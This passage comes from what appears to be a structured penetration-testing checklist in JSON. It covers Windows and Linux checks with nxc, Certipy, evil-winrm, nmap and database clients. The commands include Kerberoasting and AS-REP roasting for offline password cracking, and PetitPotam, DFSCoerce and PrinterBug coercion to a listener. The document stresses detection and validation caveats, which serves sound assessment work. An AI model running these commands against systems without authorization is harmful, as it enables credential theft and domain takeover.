            "check": "Inspect controlled users’ group memberships, object ACLs, GPO rights, and constrained/resource-based delegation. Use BloodHound to find candidate paths.",
            "evidence": "Specific rights and objects, starting identity, prerequisites, and validation of each relevant edge.",
            "caveat": "A graph path or nonzero machine-account quota is not proof of a complete escalation chain.",
            "command": "Import-Module ActiveDirectory\n$object = Read-Host 'Object distinguished name to inspect'\n(Get-Acl -LiteralPath ('AD:\\' + $object)).Access | Format-List IdentityReference,ActiveDirectoryRights,AccessControlType,ObjectType,InheritedObjectType,IsInherited",
            "validation": "An applicable allow ACE grants your identity or one of its groups unintended control of the specific object. Resolve object-type GUIDs, inheritance, deny ACEs and group membership before claiming an escalation path.",
            "runOn": "Domain-connected Windows host · PowerShell",
            "setup": "Requires the ActiveDirectory PowerShell module and an authenticated AD session. Read-only ACL review does not prove a complete escalation chain.",
            "guidance": "Run in an authenticated Windows session with the ActiveDirectory module installed. Enter the full directory name of the object to inspect. Look for your user or group being allowed to change a more privileged account. Check group membership and deny rules before claiming the permission is usable.",
            "searchTerms": [
              "AD permissions and delegation"
            ]
          },
          {
            "title": "Find risky login-certificate settings (AD CS)",
            "check": "Check certificate templates/enrollment rights and enrollment endpoints. For relay, establish an authentication source, reachable destination, protocol protections, and useful identity permissions.",
            "evidence": "Configuration and prerequisites; separately record attempted versus successful relay or certificate issuance.",
            "caveat": "Coercion/poisoning are active actions. SMB signing checks alone do not assess HTTP enrollment relay protections.",
            "command": "certipy find -u {BIND_ID} -dc-ip {DC} -vulnerable -enabled -stdout",
            "validation": "An enabled template/CA configuration and effective enrollment rights form a candidate path for this identity. A Certipy flag alone does not prove certificate issuance, impersonation or a working relay.",
            "runOn": "Testing workstation · Bash",
            "setup": "Use a valid UPN identity. Certipy prompts for a password. Check the installed version’s help; this command enumerates AD CS, not an NTLM relay attempt.",
            "guidance": "AD CS issues login certificates. Enter a domain identity such as alice@domain.local and supply its password to Certipy. Review flagged templates, enrollment permissions and who can choose the certificate identity. Follow up on a template your account can actually use.",
            "searchTerms": [
              "AD CS and NTLM relay"
            ]
          },
          {
            "title": "Kerberoastable service accounts",
            "command": "KISS_ROAST_DIR=$(mktemp -d)\nread -rsp 'Domain password: ' KISS_CHECK_PASSWORD; echo\nnxc ldap {DC} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" --kerberoasting \"$KISS_ROAST_DIR/tgs.txt\"\nunset KISS_CHECK_PASSWORD\nprintf 'Tickets: %s/tgs.txt\\n' \"$KISS_ROAST_DIR\"",
            "guidance": "With a valid domain login, request tickets for accounts running services. Returned hashes can be tested offline for weak passwords; their presence alone does not mean a password was recovered. Keep the account names and output path. Domain DNS and the workstation clock must be correct.",
            "check": "Requires a valid domain account and working domain DNS/time. Returned TGS hashes confirm ticket material is available for offline testing. They do not prove a weak password; record the SPN/account and verify recovery separately. This does not modify SPNs.",
            "validation": "Requires a valid domain account and working domain DNS/time. Returned TGS hashes confirm ticket material is available for offline testing. They do not prove a weak password; record the SPN/account and verify recovery separately. This does not modify SPNs.",
            "evidence": "Save the exact command, identity, target, tool version and raw result.",
            "caveat": "A transport or authentication error is inconclusive; verify the module actually ran.",
            "runOn": "Testing workstation · Bash",
            "references": [
              {
                "label": "NetExec reference",
                "url": "https://www.netexec.wiki/ldap-protocol/kerberoasting"
              }
            ]
          },
          {
            "title": "AS-REP roasting without credentials",
            "command": "KISS_ROAST_DIR=$(mktemp -d)\nnxc ldap {DC} -d {SMB_DOMAIN} -u {TARGET_USER} -p '' --asreproast \"$KISS_ROAST_DIR/asrep.txt\"\nprintf 'Results: %s/asrep.txt\\n' \"$KISS_ROAST_DIR\"",
            "guidance": "Enter one known domain username. If the command returns an AS-REP hash, that account allows ticket material to be requested without proving its password first. You can assess password strength offline next. “Preauthentication required” means this technique does not apply; “unknown principal” suggests the username or domain is wrong.",
            "check": "Tests one known username without a password. An AS-REP hash confirms preauthentication is disabled and offline password testing is possible. A preauthentication-required response is not vulnerable to this technique; an unknown-principal response suggests a wrong username/domain.",
            "validation": "Tests one known username without a password. An AS-REP hash confirms preauthentication is disabled and offline password testing is possible. A preauthentication-required response is not vulnerable to this technique; an unknown-principal response suggests a wrong username/domain.",
            "evidence": "Save the exact command, identity, target, tool version and raw result.",
            "caveat": "A transport or authentication error is inconclusive; verify the module actually ran.",
            "runOn": "Testing workstation · Bash",
            "references": [
              {
                "label": "NetExec reference",
                "url": "https://www.netexec.wiki/ldap-protocol/asreproast"
              }
            ]
          },
          {
            "title": "Delegation paths",
            "command": "read -rsp 'Domain password: ' KISS_CHECK_PASSWORD; echo\nnxc ldap {DC} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" --find-delegation\nunset KISS_CHECK_PASSWORD",
            "guidance": "Delegation lets one service act on behalf of a user when contacting another service. Use domain credentials to list these relationships. Look for a delegating account you control and a useful destination. A relationship alone does not prove you can impersonate an administrator.",
            "check": "Requires domain credentials. Review the returned account, delegation type and destination SPN. A configured relationship is a lead; confirm control of the delegating identity and applicable restrictions before claiming impersonation.",
            "validation": "Requires domain credentials. Review the returned account, delegation type and destination SPN. A configured relationship is a lead; confirm control of the delegating identity and applicable restrictions before claiming impersonation.",
            "evidence": "Save the exact command, identity, target, tool version and raw result.",
            "caveat": "A transport or authentication error is inconclusive; verify the module actually ran.",
            "runOn": "Testing workstation · Bash",
            "references": [
              {
                "label": "NetExec reference",
                "url": "https://github.com/Pennyw0rth/NetExec/blob/main/nxc/protocols/ldap/proto_args.py"
              }
            ]
          }
        ]
      },
      {
        "title": "RDP & WinRM",
        "items": [
          {
            "title": "WinRM access with known credentials",
            "check": "Use a confirmed host and known account to establish whether the identity can open a WinRM session.",
            "evidence": "Login outcome and execution identity if a session is obtained.",
            "caveat": "This creates a remote session; it is not passive enumeration. Run whoami inside it to establish the actual identity.",
            "command": "evil-winrm -i {HOST} -u {SMB_USER}",
            "validation": "An actual WinRM session is established; whoami /all identifies the resulting token. Successful login alone does not imply administrator or SYSTEM access.",
            "runOn": "Testing workstation · Bash",
            "guidance": "WinRM provides a remote Windows command shell. Try a known credential, then run whoami /all inside a successful session to see the real user and privileges. Record the host and account. A shell can still be a normal low-privilege session."
          },
          {
            "title": "RDP security and NLA support",
            "requires": "Testing workstation; RDP port open",
            "check": "Enumerate the supported security layers. If the result suggests a weak configuration, verify actual login requirements separately.",
            "command": "nmap -Pn -n -p 3389 --script rdp-enum-encryption {HOST}",
            "evidence": "Security layers, encryption options and actual authentication requirement.",
            "caveat": "NLA supported is not necessarily NLA required. A visible login screen or open RDP port is not anonymous desktop access.",
            "references": [
              {
                "label": "Nmap: rdp-enum-encryption",
                "url": "https://nmap.org/nsedoc/scripts/rdp-enum-encryption.html"
              }
            ],
            "validation": "The service permits a prohibited security mode. NLA support is different from NLA enforcement; a login screen is not anonymous desktop access.",
            "runOn": "Testing workstation · Bash",
            "guidance": "RDP is Windows remote desktop. This checks which connection-security options it supports. Network Level Authentication (NLA) checks credentials before starting a desktop session. Supporting NLA is not the same as requiring it; verify the actual behavior before reporting a weak configuration."
          },
          {
            "title": "Local versus domain account validation",
            "requires": "Testing workstation; a known valid credential",
            "check": "Record whether the identity belongs to the domain or to this host. Test the intended service once, using the appropriate domain or local-auth option.",
            "command": "read -rsp 'Password: ' KISS_CHECK_PASSWORD; echo\nnxc smb {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" --shares\nunset KISS_CHECK_PASSWORD",
            "evidence": "Identity authority, target, protocol, result and whether an administrative action was actually possible.",
            "caveat": "A successful SMB login does not imply RDP/WinRM access. NXC authentication success and administrator indicators mean different things.",
            "references": [
              {
                "label": "NetExec: SMB shares",
                "url": "https://www.netexec.wiki/smb-protocol/enumeration/enumerate-shares-and-access"
              }
            ],
            "validation": "The named identity authenticates in the intended authority and receives unexpected access. SMB success does not imply WinRM/RDP access or administrator privileges.",
            "runOn": "Testing workstation · Bash",
            "setup": "For a local account, replace -d and its domain argument with --local-auth. Keep the username bare.",
            "guidance": "A local account belongs to one machine; a domain account is managed by the domain. Keep the username bare and use -d DOMAIN for a domain login, or --local-auth for a local one. A successful SMB login does not automatically grant remote-shell or desktop access."
          }
        ]
      },
      {
        "title": "Authentication coercion",
        "items": [
          {
            "title": "PetitPotam: authentication callback",
            "command": "read -rsp 'Domain password: ' KISS_CHECK_PASSWORD; echo\nnxc smb {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" -M coerce_plus -o METHOD=Petitpotam LISTENER={LISTENER}\nunset KISS_CHECK_PASSWORD",
            "guidance": "Start an authentication listener you control and enter its reachable address. This tries to make the Windows target authenticate to it. Confirm the target’s machine account in the listener log. That proves forced authentication, not a successful relay or takeover. Current NXC uses coerce_plus for PetitPotam.",
            "check": "Use a reachable listener you control. This actively triggers outbound authentication. Correlate the target machine identity and timestamp in your listener logs; a module success label alone is insufficient. Confirmed coercion does not prove relay or administrator access.",
            "validation": "Use a reachable listener you control. This actively triggers outbound authentication. Correlate the target machine identity and timestamp in your listener logs; a module success label alone is insufficient. Confirmed coercion does not prove relay or administrator access.",
            "evidence": "Save the exact command, identity, target, tool version and raw result.",
            "caveat": "A transport or authentication error is inconclusive; verify the module actually ran.",
            "runOn": "Testing workstation · Bash",
            "references": [
              {
                "label": "NetExec reference",
                "url": "https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/coerce_plus.py"
              }
            ]
          },
          {
            "title": "DFSCoerce: authentication callback",
            "command": "read -rsp 'Domain password: ' KISS_CHECK_PASSWORD; echo\nnxc smb {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" -M coerce_plus -o METHOD=DFSCoerce LISTENER={LISTENER}\nunset KISS_CHECK_PASSWORD",
            "guidance": "This uses a Windows file-service interface to try to make the target authenticate to your listener. Enter an address the target can reach and check the listener log for its machine account. A callback is useful evidence, but further conditions are needed to relay it into privileged access.",
            "check": "Use a reachable listener you control. This actively triggers outbound authentication. Correlate the target machine identity and timestamp in your listener logs; a module success label alone is insufficient. Confirmed coercion does not prove relay or administrator access.",
            "validation": "Use a reachable listener you control. This actively triggers outbound authentication. Correlate the target machine identity and timestamp in your listener logs; a module success label alone is insufficient. Confirmed coercion does not prove relay or administrator access.",
            "evidence": "Save the exact command, identity, target, tool version and raw result.",
            "caveat": "A transport or authentication error is inconclusive; verify the module actually ran.",
            "runOn": "Testing workstation · Bash",
            "references": [
              {
                "label": "NetExec reference",
                "url": "https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/coerce_plus.py"
              }
            ]
          },
          {
            "title": "PrinterBug: authentication callback",
            "command": "read -rsp 'Domain password: ' KISS_CHECK_PASSWORD; echo\nnxc smb {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" -M coerce_plus -o METHOD=Printerbug LISTENER={LISTENER}\nunset KISS_CHECK_PASSWORD",
            "guidance": "This uses the Windows printing service to try to make the target authenticate to your listener. Check for the target’s machine account in the listener log, rather than trusting only NXC’s success message. If the printing service is unavailable, the check may not apply.",
            "check": "Use a reachable listener you control. This actively triggers outbound authentication. Correlate the target machine identity and timestamp in your listener logs; a module success label alone is insufficient. Confirmed coercion does not prove relay or administrator access.",
            "validation": "Use a reachable listener you control. This actively triggers outbound authentication. Correlate the target machine identity and timestamp in your listener logs; a module success label alone is insufficient. Confirmed coercion does not prove relay or administrator access.",
            "evidence": "Save the exact command, identity, target, tool version and raw result.",
            "caveat": "A transport or authentication error is inconclusive; verify the module actually ran.",
            "runOn": "Testing workstation · Bash",
            "references": [
              {
                "label": "NetExec reference",
                "url": "https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/coerce_plus.py"
              }
            ]
          }
        ]
      },
      {
        "title": "Local privileges & patch checks",
        "items": [
          {
            "title": "What can your current Windows account do?",
            "check": "Review token privileges, service/task permissions, writable privileged executables/scripts, and installed applications. Inspect the entry service’s own files first.",
            "evidence": "Current identity, relevant ACL/token, privileged execution context, and how that context reaches the writable object.",
            "caveat": "A token privilege or unquoted path alone does not guarantee SYSTEM. Check all required permissions and trigger conditions.",
            "command": "whoami /all\nnetstat -ano\ncmdkey /list",
            "validation": "The current token or a writable privileged execution path creates a specific candidate escalation. whoami /all is account-specific; RPC enumprivs is not. Validate prerequisites before claiming escalation.",
            "runOn": "Target Windows host · PowerShell or cmd",
            "guidance": "Run these in the Windows shell to identify your account, groups, privileges, connections and saved-credential references. Follow unusual privileges or credential references into a focused test. Use whoami /all for your actual session; rpcclient enumprivs lists the server’s privilege catalog.",
            "searchTerms": [
              "Local privileges and execution paths"
            ]
          },
          {
            "title": "EternalBlue / MS17-010 candidate",
            "check": "If SMB is exposed, use a reviewed detection check for MS17-010 and verify OS/patch context. Prioritize the result only when its prerequisites fit.",
            "evidence": "Detection output, target build/patch evidence where available, and detector limitations.",
            "caveat": "A vulnerability detector and an exploit are separate actions. Do not auto-exploit; exploitation can disrupt the host.",
            "command": "nxc smb {HOST} -u '' -p '' -M ms17-010",
            "validation": "VULNERABLE is a positive MS17-010 protocol check, not demonstrated EternalBlue code execution. Confirm OS/patch context and retain raw output. A failed SMB connection or skipped module is inconclusive.",
            "runOn": "Testing workstation · Bash",
            "guidance": "A VULNERABLE result means the SMB service responded like a system missing the MS17-010 fixes. Save the output and confirm the Windows version and patch state. This check does not run an EternalBlue payload or demonstrate code execution. Connection errors are inconclusive.",
            "references": [
              {
                "label": "NetExec: ms17-010",
                "url": "https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/ms17-010.py"
              }
            ]
          },
          {
            "title": "Zerologon / CVE-2020-1472 candidate",
            "check": "On a confirmed DC, review patch and Netlogon protection evidence. Use an approved detection-only check only if engagement rules allow it.",
            "evidence": "DC identity, patch/protection evidence, and exact detector result if used.",
            "caveat": "Detection is active too. Exploitation can change the DC machine-account password and break domain operations; it is not a routine opening action.",
            "command": "nxc smb {HOST} -u '' -p '' -M zerologon",
            "validation": "Run against a confirmed DC. VULNERABLE indicates a successful all-zero Netlogon authentication check. The reviewed module retries up to 2,000 times but does not reset the machine password. A connection error or failure to launch the module is inconclusive; preserve raw output and NXC version.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Use this on a confirmed domain controller. It checks whether Netlogon accepts a special invalid login, retrying up to 2,000 times. VULNERABLE is a positive detection result. The reviewed module does not reset the machine password. Save the full output; a connection error does not mean the DC is patched.",
            "references": [
              {
                "label": "NetExec: zerologon",
                "url": "https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/zerologon.py"
              }
            ]
          }
        ]
      },
      {
        "title": "FTP & file transfer",
        "items": [
          {
            "title": "FTP anonymous listing",
            "requires": "Testing workstation; FTP port open",
            "check": "Try anonymous login and inspect a bounded directory listing. Follow up only on specific files relevant to the engagement.",
            "command": "nmap -Pn -n -p 21 --script ftp-anon {HOST}",
            "evidence": "Login response, path, listing and actual access to a relevant file.",
            "caveat": "A writable flag in a listing is not a demonstrated write. Separate intended public downloads from sensitive exposure.",
            "references": [
              {
                "label": "Nmap: ftp-anon",
                "url": "https://nmap.org/nsedoc/scripts/ftp-anon.html"
              }
            ],
            "validation": "Anonymous login plus a listing establishes directory visibility. A file-disclosure or write-access finding needs the corresponding minimal file operation.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check the FTP service for anonymous access. Look for IIS site files, web.config, deployment packages and backups. If a file contains a credential or connection string, link it to the Windows application or database that uses it."
          },
          {
            "title": "Can TFTP return a file without a login?",
            "requires": "Confirmed UDP response or service configuration",
            "check": "For TFTP, identify a known file from configuration or documentation before requesting it. For NTP, IKE and other UDP services, verify the protocol response and version first.",
            "command": "curl -q --max-time 10 --output kiss-tftp-sample.bin {TFTP_URL}\nwc -c kiss-tftp-sample.bin",
            "evidence": "Exact request, returned bytes, source/destination and timeout behavior.",
            "caveat": "Do not infer a vulnerability from open|filtered or guess a huge file list. TFTP has no directory-listing operation.",
            "validation": "The returned file contains information that should not be anonymously readable. A timeout or empty output is inconclusive.",
            "runOn": "Testing workstation · Bash",
            "setup": "Set TFTP URL to tftp://HOST/known-file from configuration or documentation. This overwrites kiss-tftp-sample.bin locally; curl must include TFTP support.",
            "guidance": "Use a known TFTP filename from deployment or provisioning documentation. Inspect a returned Windows unattended-install or configuration file for credentials and internal hostnames. The download replaces kiss-tftp-sample.bin locally; curl needs TFTP support.",
            "searchTerms": [
              "TFTP and other UDP leads"
            ]
          }
        ]
      },
      {
        "title": "Databases & application storage",
        "items": [
          {
            "title": "Does the SQL Server account have excessive rights?",
            "check": "Review SQL roles, impersonation rights, linked servers, and services reachable only from the foothold. Record where each credential actually works.",
            "evidence": "Login context, privileges, endpoints, and access confirmed on each system.",
            "caveat": "Authenticating to a service does not prove remote execution. Enabling features or changing configuration is a separate step.",
            "command": "read -rsp 'Password: ' KISS_CHECK_PASSWORD; echo\nnxc mssql {HOST} -d {SMB_DOMAIN} -u {USER} -p \"$KISS_CHECK_PASSWORD\" -q \"SELECT ORIGINAL_LOGIN() AS original_login, SUSER_SNAME() AS effective_login, IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin; SELECT name, product, data_source FROM sys.servers;\"\nunset KISS_CHECK_PASSWORD",
            "validation": "The effective SQL identity has unexpected sysadmin rights or a linked-server path with verified excessive permissions. A linked-server name alone is not proof of access.",
            "runOn": "Testing workstation · Bash",
            "setup": "For a SQL-native login use --local-auth instead of -d and its argument. This query does not enable command execution.",
            "guidance": "Check the effective SQL login and is_sysadmin result. For a Windows domain login, use -d DOMAIN; for a SQL-only account, use --local-auth instead. Review linked servers and which Windows account runs SQL Server to understand where excessive database access could lead.",
            "searchTerms": [
              "MSSQL and internal services"
            ]
          },
          {
            "title": "Does the PostgreSQL account have excessive rights?",
            "check": "Check whether the identified database requires authentication and what privileges the available login has.",
            "evidence": "Connection identity, database, and role attributes.",
            "caveat": "A rejected login is not a vulnerability. Do not enable command execution or change server settings merely to inventory roles.",
            "command": "psql -h {HOST} -U {USER} -d {DATABASE} -W -c 'SELECT rolname, rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;'",
            "validation": "The effective account has unjustified elevated role flags. This does not establish that arbitrary OS commands were executed.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Use the PostgreSQL credential found in the Windows application’s settings. Check rolsuper and role-creation permissions, then review the Windows service account and data-directory permissions if you have host access. Keep database roles separate from Windows administrator rights.",
            "searchTerms": [
              "PostgreSQL role and authentication exposure"
            ]
          },
          {
            "title": "Which permissions does the MySQL account have?",
            "requires": "Testing workstation; supplied database account",
            "check": "Connect with a password prompt. Inspect the authenticated identity and grants before reading application tables.",
            "command": "mysql --host={HOST} --user={USER} --password --execute='SELECT USER(), CURRENT_USER(), VERSION(); SHOW GRANTS;'",
            "evidence": "Connection identity, effective database account, server version and grants.",
            "caveat": "USER() and CURRENT_USER() can differ. A banner alone is not proof of weak authentication; avoid changing global settings to demonstrate impact.",
            "references": [
              {
                "label": "Nmap: mysql-info",
                "url": "https://nmap.org/nsedoc/scripts/mysql-info.html"
              }
            ],
            "validation": "The effective account’s grants exceed its intended role. A valid connection alone does not establish overprivilege.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Connect with the application’s MySQL or MariaDB credential and inspect SHOW GRANTS. Look for access beyond its own database. With Windows host access, compare the service account and permissions on my.ini and application configuration files.",
            "searchTerms": [
              "MySQL / MariaDB identity and grants"
            ]
          },
          {
            "title": "MongoDB anonymous database visibility",
            "requires": "Testing workstation; MongoDB reachable",
            "check": "Connect without credentials and request database names only. Distinguish a successful connection from permission to list or read data.",
            "command": "mongosh --host {HOST} --port 27017 --quiet --eval 'db.adminCommand({listDatabases: 1, nameOnly: true})'",
            "evidence": "Authentication context, returned database names or authorization error.",
            "caveat": "A connection handshake alone is not unauthorized data access. Do not bulk dump collections to establish a limited exposure.",
            "references": [
              {
                "label": "MongoDB: shell options",
                "url": "https://www.mongodb.com/docs/mongodb-shell/reference/options/"
              }
            ],
            "validation": "Database names are returned without credentials when that metadata should be restricted. Handshake success alone does not establish record reads.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check whether MongoDB returns database names without credentials. Follow up with a small relevant record and inspect the Windows service configuration if available. Useful leads include exposed connection strings and data belonging to other application users."
          },
          {
            "title": "Redis unauthenticated command access",
            "requires": "Testing workstation; Redis reachable",
            "check": "Try a read-only identity query without credentials. If allowed, inspect only the minimum server metadata needed to characterize exposure.",
            "command": "redis-cli -h {HOST} -p 6379 ACL WHOAMI",
            "evidence": "Result or NOAUTH response, target and whether any credentials were supplied.",
            "caveat": "ACL WHOAMI exists from Redis 6. An unsupported command is not proof of authentication. Success proves this command was permitted, not access to every key.",
            "references": [
              {
                "label": "Redis: ACL WHOAMI",
                "url": "https://redis.io/docs/latest/commands/acl-whoami/"
              }
            ],
            "validation": "ACL WHOAMI returns an identity without credentials. This demonstrates permission to run that command, not unrestricted access to every key or command.",
            "runOn": "Testing workstation · Bash",
            "guidance": "If Redis backs a Windows application, check whether it accepts this command without credentials. NOAUTH means login is required. Trace any accessible data to the application; establish whether Redis runs on Windows, a container or a separate Linux host before choosing local checks."
          }
        ]
      },
      {
        "title": "Mail, monitoring & management",
        "items": [
          {
            "title": "SMTP capabilities and transport",
            "requires": "Testing workstation; SMTP service reachable",
            "check": "Inspect advertised commands and STARTTLS support before testing any mail-delivery behavior.",
            "command": "nmap -Pn -n -p 25,465,587 --script smtp-commands {HOST}",
            "evidence": "Port, EHLO capabilities, TLS availability and advertised authentication mechanisms.",
            "caveat": "Normal inbound SMTP accepts unauthenticated connections. This does not establish open relay or mailbox access.",
            "references": [
              {
                "label": "Nmap: smtp-commands",
                "url": "https://nmap.org/nsedoc/scripts/smtp-commands.html"
              }
            ],
            "validation": "The response establishes capabilities. Unauthenticated EHLO and inbound mail reception are normal and do not prove open relay.",
            "runOn": "Testing workstation · Bash",
            "guidance": "For Exchange or another Windows mail service, note the advertised login and STARTTLS options. Identify whether you are testing inbound mail or user submission, since their authentication requirements differ. Use a controlled delivery test to investigate relay."
          },
          {
            "title": "Prove mail relay with controlled addresses",
            "requires": "Two approved test mailboxes and an agreed delivery test",
            "check": "Differentiate external-to-local delivery from external-to-external relay. If permitted, send one uniquely marked message between controlled mailboxes and verify receipt.",
            "command": "swaks --server {HOST} --from {MAIL_FROM} --to {MAIL_TO} --header \"Subject: KISS controlled relay test\" --body \"Controlled competition delivery test.\"",
            "evidence": "MAIL FROM, RCPT TO, acceptance responses, message ID and receipt at the destination.",
            "caveat": "RCPT acceptance may still be followed by rejection. Do not label normal mail reception an anonymous-login vulnerability.",
            "validation": "The unauthenticated external-to-external message is delivered to your controlled recipient. RCPT acceptance alone is not proof of delivery.",
            "runOn": "Testing workstation · Bash",
            "setup": "Use two controlled mailboxes outside the server’s local domains. This sends one actual message; save the received headers and SMTP transcript.",
            "guidance": "Test the Windows mail server using two controlled mailboxes outside its accepted domains. This sends one actual message. Preserve the received headers and SMTP responses, and identify which receive connector or relay restriction needs attention."
          },
          {
            "title": "SNMPv3 discovery metadata",
            "requires": "Testing workstation with raw-packet privileges; UDP 161",
            "check": "Request the SNMPv3 discovery information to identify the engine and target implementation.",
            "command": "sudo nmap -sU -Pn -n -p 161 --script snmp-info {HOST}",
            "evidence": "Returned engine information, version and response evidence.",
            "caveat": "Engine discovery is not access to the management data. For v1/v2c, assess a supplied or explicitly tested community separately.",
            "references": [
              {
                "label": "Nmap: snmp-info",
                "url": "https://nmap.org/nsedoc/scripts/snmp-info.html"
              }
            ],
            "validation": "Discovery only: engine metadata is returned. This does not demonstrate read access to management objects.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check whether the Windows SNMP agent or an installed monitoring product returns identifying information. Use the product and version to choose the next check. Confirm the actual SNMP implementation; do not assume every Windows agent supports v3."
          },
          {
            "title": "SNMP community access",
            "requires": "Testing workstation; an approved community value",
            "check": "Use a small system-tree query, not a full walk of every table. Record which attributes are actually disclosed.",
            "command": "snmpwalk -v2c -c {COMMUNITY} -t 2 -r 1 {HOST} 1.3.6.1.2.1.1",
            "evidence": "Community context, version, sysName/sysDescr and other returned attributes.",
            "caveat": "Timeouts may mean filtering, bad community or no service. Read access does not establish write access; do not issue SET requests as an enumeration step.",
            "validation": "The tested community returns actual system attributes outside the intended access boundary. Read access does not prove SNMP write permission.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Query the Windows SNMP service with the supplied community string, its shared access password. Look for host descriptions or information about installed monitoring software. If you have host access, compare permitted clients and community permissions with the service configuration."
          },
          {
            "title": "Exposed databases and management services",
            "check": "Inspect identified Redis, MongoDB, SQL, dashboards, container APIs, and monitoring interfaces for unauthenticated access or applicable default credentials.",
            "evidence": "Minimal returned metadata/data and the identity needed to retrieve it.",
            "caveat": "A reachable port does not prove no firewall or weak authentication. Avoid data-changing probes and bulk dumps.",
            "command": "curl -q -i --max-time 15 {TEST_URL}",
            "validation": "The endpoint returns sensitive management data or performs an administrative action without the expected authentication. A product banner alone is not sufficient.",
            "runOn": "Testing workstation · Bash",
            "setup": "Set Test URL to the discovered read-only management/API endpoint. Use the dedicated Redis/MongoDB/SQL checks for non-HTTP services.",
            "guidance": "Inspect discovered IIS-hosted administration pages and installed management products. Compare logged-out access with a normal Windows/domain account where the application supports it. Focus on exposed settings, secrets and actions that account should not perform."
          },
          {
            "title": "Exposed VNC and remote desktops",
            "check": "Identify VNC services and review authentication before attempting access with known or approved test credentials.",
            "evidence": "Service details, authentication mode, and actual desktop privileges if accessed.",
            "caveat": "An open VNC port is not proof of no authentication. Avoid altering the user’s desktop or ongoing work.",
            "command": "nmap -Pn -sV -p 5900 --script vnc-info {HOST}",
            "validation": "The service advertises an unintended authentication mode; confirm a real session before claiming desktop access.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check third-party VNC software installed on Windows for its advertised authentication modes. If an approved credential opens a desktop, identify the Windows session user and accessible applications. VNC is separate from the built-in RDP service."
          }
        ]
      }
    ]
  },
  {
    "id": "linux",
    "title": "Linux",
    "intro": "Once you have a shell, follow the actual identity and writable execution paths.",
    "groups": [
      {
        "title": "SSH & remote desktops",
        "items": [
          {
            "title": "Weak SSH credentials and root login",
            "check": "Check known/default credentials only when justified; identify whether recovered credentials log in directly as root.",
            "evidence": "Successful identity and the specific host.",
            "caveat": "A permitted root login is contextual; weak credentials plus root access is a stronger demonstrated finding. Use the normal password prompt.",
            "command": "ssh {SSH_USER_HOST}",
            "validation": "The tested credential opens a shell under the confirmed identity. Root login is a finding only when the credential or access policy is inappropriate.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Try the known SSH credential, then run id in the resulting shell. If it is root, record how the credential was obtained. Otherwise check groups and sudo permissions next. Distinguish a reused password from an explicitly authorized login."
          },
          {
            "title": "Exposed VNC and remote desktops",
            "check": "Identify VNC services and review authentication before attempting access with known or approved test credentials.",
            "evidence": "Service details, authentication mode, and actual desktop privileges if accessed.",
            "caveat": "An open VNC port is not proof of no authentication. Avoid altering the user’s desktop or ongoing work.",
            "command": "nmap -Pn -sV -p 5900 --script vnc-info {HOST}",
            "validation": "The service advertises an unintended authentication mode; confirm a real session before claiming desktop access.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check the Linux VNC service’s authentication options. With a working test credential, identify the desktop user and available applications. Review whether the session runs as root and whether VNC is exposed directly or only through an SSH tunnel."
          }
        ]
      },
      {
        "title": "Samba, FTP & NFS",
        "items": [
          {
            "title": "Samba guest and anonymous shares",
            "check": "Check anonymous FTP, Samba guest access, and exported NFS shares. Inspect accessible configs, backups, and deployment files.",
            "evidence": "Service, identity, export/share path, and actual read access.",
            "caveat": "An advertised export or listed share is not proof of access. NFSv4-only exports may not appear in showmount.",
            "command": "nxc smb {HOST} -u '' -p '' --shares\nnxc smb {HOST} -u guest -p '' --shares",
            "validation": "An anonymous identity reads actual unintended content. Advertised shares/exports alone are leads.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Samba provides Windows-style file shares on Linux. Try anonymous and guest logins separately, then inspect relevant application files or backups. With host access, compare share settings in smb.conf with the underlying Linux file ownership.",
            "searchTerms": [
              "Anonymous FTP, SMB, and NFS"
            ]
          },
          {
            "title": "FTP anonymous listing",
            "requires": "Testing workstation; FTP port open",
            "check": "Try anonymous login and inspect a bounded directory listing. Follow up only on specific files relevant to the engagement.",
            "command": "nmap -Pn -n -p 21 --script ftp-anon {HOST}",
            "evidence": "Login response, path, listing and actual access to a relevant file.",
            "caveat": "A writable flag in a listing is not a demonstrated write. Separate intended public downloads from sensitive exposure.",
            "references": [
              {
                "label": "Nmap: ftp-anon",
                "url": "https://nmap.org/nsedoc/scripts/ftp-anon.html"
              }
            ],
            "validation": "Anonymous login plus a listing establishes directory visibility. A file-disclosure or write-access finding needs the corresponding minimal file operation.",
            "runOn": "Testing workstation · Bash",
            "guidance": "Check the FTP service for anonymous access. Follow accessible web roots, deployment folders and backups into relevant configuration files. If you have a shell, compare the FTP account’s permissions with the Linux file ownership and service settings."
          },
          {
            "title": "NFS export visibility",
            "requires": "Testing workstation; rpcbind or NFS open",
            "check": "List advertised exports and allowed clients, then compare with expected network boundaries.",
            "command": "nmap -Pn -n -sV -p 111,2049 --script nfs-showmount {HOST}",
            "evidence": "Export path, allowed client range and the identity/vantage used.",
            "caveat": "Export visibility alone does not prove readable files. NFSv4-only servers may not expose the mount service, so an empty result is inconclusive.",
            "references": [
              {
                "label": "Nmap: nfs-showmount",
                "url": "https://nmap.org/nsedoc/scripts/nfs-showmount.html"
              }
            ],
            "validation": "The export is advertised to this client. Confirm actual unintended file access before claiming disclosure; visibility alone does not prove mount/read access.",
            "runOn": "Testing workstation · Bash",
